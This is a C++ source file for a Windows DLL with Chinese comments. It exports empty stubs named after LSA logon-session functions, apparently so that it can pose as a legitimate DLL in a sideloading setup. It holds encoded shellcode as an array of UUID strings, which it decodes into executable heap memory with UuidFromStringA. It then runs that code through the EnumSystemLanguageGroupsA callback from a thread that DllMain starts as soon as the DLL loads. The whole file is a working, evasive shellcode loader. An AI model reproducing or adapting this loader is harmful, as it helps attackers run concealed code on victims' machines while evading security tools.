// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")


extern "C" __declspec(dllexport) void LsaGetLogonSessionData() {}
extern "C" __declspec(dllexport) void LsaEnumerateLogonSessions() {}
extern "C" __declspec(dllexport) void LsaFreeReturnBuffer() {}


const char* buf[] = {
    "4baf01bd-dbdd-d9de-7424-f45a33c9b131",
    "83136a31-04c2-6a03-0e4d-be21f81341da",
    "3fcb73f8-b3c9-34af-7904-bb1975efe989",
    "bd259d0e-28a7-f010-3800-6093ba5bb573",
    "72c89383-cec4-2621-9d85-94d7aad02453",
    "802cf5e0-f4b0-171d-cbae-bd9918dbf781",
    "394ee67d-9cb5-eb50-845d-fed229acfe13",
    "6a754f8d-f2ee-a98e-8d28-1a2a35babc96",
    "5c5a6fc4-c4ca-3a28-cedb-fd30ea500097",
    "3327227b-f020-6246-8c57-76746f07d2fe",
    "5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68",
    "bad08a62-64c7-e79b-61ed-4272307075a8",
    "59f68d76-6a06-2be6-0336-a0c0792745e7",
    "844c482e-dab1-650c-545b-b67900000000"
};



DWORD WINAPI run(LPVOID lpParameter) {
    int dwNum = sizeof(buf) / sizeof(buf[0]);

    HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
    if (hMemory == NULL) {
        return -1;
    }
    PVOID pMemory = HeapAlloc(hMemory, 0, 1024);

    DWORD_PTR CodePtr = (DWORD_PTR)pMemory;

    for (size_t i = 0; i < dwNum; i++)
    {
        if (CodePtr == NULL) {
            break;
        }
        RPC_STATUS	status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);
        if (status != RPC_S_OK) {

            return -1;
        }
        CodePtr += 16;
    }

    if (pMemory == NULL) {
        return -1;
    }
    if (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL) == FALSE) {
        // 加载成功
        return 0;
    }
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        MessageBoxA(0, 0, 0, 0);
        CreateThread(NULL, 0, run, NULL, 0, NULL);
        DisableThreadLibraryCalls(hModule);
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH)
    {

    }
    return TRUE;
}

